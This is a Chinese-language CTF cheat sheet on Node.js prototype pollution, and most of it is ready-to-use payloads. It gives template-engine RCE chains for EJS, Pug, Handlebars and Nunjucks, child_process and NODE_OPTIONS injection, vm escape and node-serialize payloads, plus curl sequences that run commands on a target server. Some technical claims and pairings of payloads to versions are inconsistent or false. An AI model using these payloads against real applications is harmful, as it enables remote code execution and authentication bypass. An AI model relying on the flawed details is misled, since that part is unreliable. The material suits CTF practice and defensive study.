---
category: "Node.js安全"
tags: ["Node.js", "原型链污染", "Prototype Pollution", "JavaScript", "EJS", "Pug", "Handlebars", "Lodash", "NPM", "RCE", "AST注入"]
difficulty: "高级"
---

# Node.js与JavaScript原型链污染

## 1. 概述
原型链污染（Prototype Pollution）是JavaScript/Node.js特有的漏洞类型。攻击者通过操控对象的`__proto__`属性污染全局原型链，注入恶意属性，从而影响应用程序的逻辑判断或触发代码执行。这是CTF Node.js方向最核心的攻击技术，常与模板引擎RCE、权限绕过、RCE等组合利用。

**核心攻击面：**
- 不安全的深度合并/赋值函数（merge, extend, cloneDeep）
- `Object.assign()`误用
- 对象路径设置（`lodash.set`等）
- URL参数/JSON body自动解析到对象

## 2. 核心原理

JavaScript的原型链决定了属性查找机制：
```
obj.prop → 查找obj自身 → 找不到查obj.__proto__ → 
找不到查obj.__proto__.__proto__ → ... → null
```

若攻击者污染了`Object.prototype`，则将影响所有对象。

```javascript
// 漏洞函数（递归合并）
function merge(target, source) {
    for (let key in source) {
        if (key === '__proto__' || key === 'constructor') {
            merge(target[key], source[key]);  // 递归污染！
        } else if (typeof target[key] === 'object' && typeof source[key] === 'object') {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}
```

**检测Payload：**
```javascript
// URL参数
?__proto__[polluted]=yes
?constructor[prototype][polluted]=yes
?__proto__.polluted=yes

// JSON body
{"__proto__": {"polluted": "yes"}}
{"constructor": {"prototype": {"polluted": "yes"}}}

// 如果过滤__proto__
{"__proto__": {"__proto__": {"polluted": "yes"}}}  // 双重

// 验证污染成功
// 正常访问 {}['polluted'] 应返回 undefined
// 污染后返回 "yes"
```

## 3. 关键技巧与Payload

### 3.1 常见污染入口函数

| 库 | 函数 | 版本 |
|----|------|------|
| lodash | `_.defaultsDeep()` | < 4.17.0 |
| lodash | `_.merge()` / `_.mergeWith()` | < 4.17.12 |
| lodash | `_.set()` / `_.setWith()` | 部分版本 |
| jQuery | `$.extend(true,...)` | < 3.4.0 |
| Hoek | `Hoek.merge()` | < 6.1.3 |
| merge | `merge()` | < 2.1.0 |
| deepmerge | `deepmerge()` | < 4.0.0 |
| undefsafe | `undefsafe()` | < 2.0.3 |
| just-clone | `justClone()` | < 1.0.0 |
| mpath | `mpath.set()` | < 0.5.0 |

### 3.2 权限绕过

```javascript
// 应用检查
if (user.isAdmin) {
    // 管理员功能
}

// 污染原型链
{"__proto__": {"isAdmin": true}}
// 现在所有对象的.isAdmin都是true

// 绕过认证
{"__proto__": {"authenticated": true, "role": "admin"}}

// 绕过输入验证
{"__proto__": {"length": 0}}  // 使所有数组长度为0
```

### 3.3 污染触发RCE — EJS模板引擎

**EJS RCE链1（通过outputFunctionName）：**
```javascript
// 污染
{"__proto__": {
    "outputFunctionName": "a; return global.process.mainModule.constructor._load('child_process').execSync('id'); //"
}}

// 或设置 client 选项
{"__proto__": {
    "client": 1,
    "escapeFunction": "1; return global.process.mainModule.constructor._load('child_process').execSync('id');"
}}
```

**EJS RCE链2（通过opts）：**
```javascript
{"__proto__": {
    "sourceURL": "\x0a return process.mainModule.require('child_process').execSync('id'); //"
}}

// EJS 3.1.6+ 修复后的绕过
{"__proto__": {
    "destructuredLocals": ["__line=process.mainModule.require('child_process').execSync('id')"]
}}
```

**EJS RCE链3（destructuredLocals, EJS 3.1.9+）：**
```json
{
  "__proto__": {
    "escape": 1,
    "escapeFunction": "a;return global.process.mainModule.require('child_process').execSync('id');"
  }
}
```

### 3.4 污染触发RCE — Pug/Jade

```javascript
// Pug RCE
{"__proto__": {
    "debug": true,
    "compileDebug": 1
}}
// 使得Pug输出代码给客户端

// Pug RCE链2 (通过line参数)
{"__proto__": {"self": 1, "line": "global.process.mainModule.require('child_process').execSync('id')"}}
```

### 3.5 污染触发RCE — Handlebars

```javascript
// Handlebars RCE
{"__proto__": {
    "precompileOptions": {
        "knownHelpersOnly": false,
        "knownHelpers": {
            "system": "function(){ return require('child_process').execSync('id').toString(); }"
        }
    }
}}

// 或
{"__proto__": {
    "compileOptions": {
        "knownHelpers": {}
    }
}}
```

### 3.6 污染触发RCE — Nunjucks

```javascript
{"__proto__": {
    "globals": ["global.process.mainModule.require('child_process').execSync('id')"]
}}
```

### 3.7 通用RCE链（无模板引擎）

**通过child_process模块：**
```javascript
// 污染一个会被传递给exec/spawn的参数
{"__proto__": {"shell": "node"}}
{"__proto__": {"NODE_OPTIONS": "--require /etc/passwd"}}

// env污染
{"__proto__": {
    "env": {
        "NODE_OPTIONS": "--require ./evil.js"
    }
}}
```

**通过require污染：**
```javascript
// AST注入/文件写入 → 再require
// 如果应用使用某些有写文件功能的模块
{"__proto__": {"data": "Y29uc3QgeCA9IHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjU3luYygnbHMnKTs="}}
```

### 3.8 绕过`__proto__`检测

```javascript
// 浏览器中的替代方案（部分Node.js也适用）
constructor.prototype.polluted = true
// JSON: {"constructor": {"prototype": {"polluted": "yes"}}}

// 通过Reflect
{"__proto__": {"constructor": {"prototype": {"polluted": "yes"}}}}

// 使用数字/数组key
{"123": {"__proto__": {"polluted": "yes"}}}

// ES6 Proxy (高级，需要代码逻辑配合)
```

**lodash.set绕过：**
```javascript
// lodash.set 对__proto__做了特殊处理
// 但可以通过constructor.prototype绕过
{"constructor": {"prototype": {"polluted": "yes"}}}
```

### 3.9 常见RCE利用确认步骤

```
1. 注入检测Payload，验证是否污染成功
2. 识别使用的模板引擎（EJS/Pug/Handlebars/Nunjucks）
3. 选择对应Payload进行RCE
4. 若无模板引擎，尝试:
   - process.mainModule.require('child_process')
   - global.process.mainModule.constructor._load()
   - 环境变量注入（NODE_OPTIONS）
   - 命令注入（shell/exec路径）
```

### 3.10 Node.js RCE的其他武器

**vm逃逸：**
```javascript
// vm.runInNewContext 老版本逃逸
const code = `
  this.constructor.constructor('return this.process.env')()
`;
// 或
const sandbox = {};
vm.runInNewContext('const x = this.constructor.constructor("return process")().mainModule.require("child_process").execSync("cat /flag").toString();', sandbox);
```

**AST注入：**
```
// 如果应用解析JavaScript AST并且用户能控制部分代码
// 可注入恶意AST节点执行任意代码
// 工具: ASTExplorer
```

**反序列化：**
```javascript
// node-serialize unserialize RCE
"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"

// serialize-javascript unserialize via eval
// 注意版本差异
```

## 4. 常见误区与注意事项
1. **原型链污染的影响范围**：污染了`Object.prototype`会全局影响，包括node_modules中的代码，可能导致不可预见的后果。CTF中成功污染后建议立即执行RCE。
2. **lodash版本检测**：`_.defaultsDeep`在4.17.0修复，但`_.mergeWith`延迟到4.17.12。需要确认精确版本。
3. **EJS版本很关键**：3.1.6后许多经典链被修，需要用destructuredLocals或sourceURL等绕过。
4. **JSON中的`__proto__`可能被忽略**：某些JSON解析器在解析时跳过`__proto__`（如JSON.parse本身不污染，是后续的merge操作污染）。
5. **Node.js较新版本的限制**：`--require`的环境变量注入在某些新版本/安全配置下失效。
6. **不使用模板引擎也能RCE**：如果找到合理的sink（如`child_process.exec`且参数可控），可直接命令注入，不需要模板引擎。
7. **CTF中污染检测技巧**：先设一个特殊的普通属性名（如`polluted_check_123`）验证污染成功，再用标准链RCE。
8. **offline策略**：本地准备各版本lodash, EJS, Pug, Handlebars的Docker环境；保存各模板引擎版本对应的RCE payload；会编写简单merge函数快速测试。

## 5. 实战示例

### 示例1：EJS原型链污染 RCE
```
场景：Express + EJS + lodash.merge 接收JSON body
```
步骤：
```bash
# 1. 探测（发送检测Payload）
curl -X POST http://target.com/api/update \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"polluted_12345":"yes"}}'

# 2. 触发EJS渲染并验证
curl http://target.com/page  # 检查页面是否渲染，也可触发dnslog

# 3. RCE Payload (EJS 3.1.5)
curl -X POST http://target.com/api/update \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"outputFunctionName":"x;process.mainModule.require(\"child_process\").execSync(\"cat /flag\");s"}}'

# 4. 触发渲染读取结果
curl http://target.com/page
```

### 示例2：无模板引擎 — 环境变量注入RCE
```
场景：Express应用使用child_process.exec但无模板引擎
     lodash.merge存在可污染child_process配置
```
步骤：
```bash
curl -X POST http://target.com/api/data \
  -H 'Content-Type: application/json' \
  -d '{"constructor":{"prototype":{"shell":"/bin/node"}}}'
# 然后触发exec → shell被改为node → 可执行Node代码

# 或
curl -X POST http://target.com/api/data \
  -H 'Content-Type: application/json' \
  -d '{"constructor":{"prototype":{"env":{"NODE_OPTIONS":"--require /tmp/evil.js"}}}}'
# 需提前写evil.js到/tmp (文件上传/写文件)
```

## 6. 相关知识点
- XSS中的原型链污染（Client-side，见02-XSS与前端漏洞）
- 反序列化中的Node.js unserialize（见06-反序列化漏洞）
- 模板注入SSTI中的Node.js模板引擎（见03-服务端模板注入SSTI）
- 命令注入中的Node.js child_process（见08-命令注入与代码注入）
- CSRF结合原型链污染（见09-认证鉴权与逻辑漏洞）
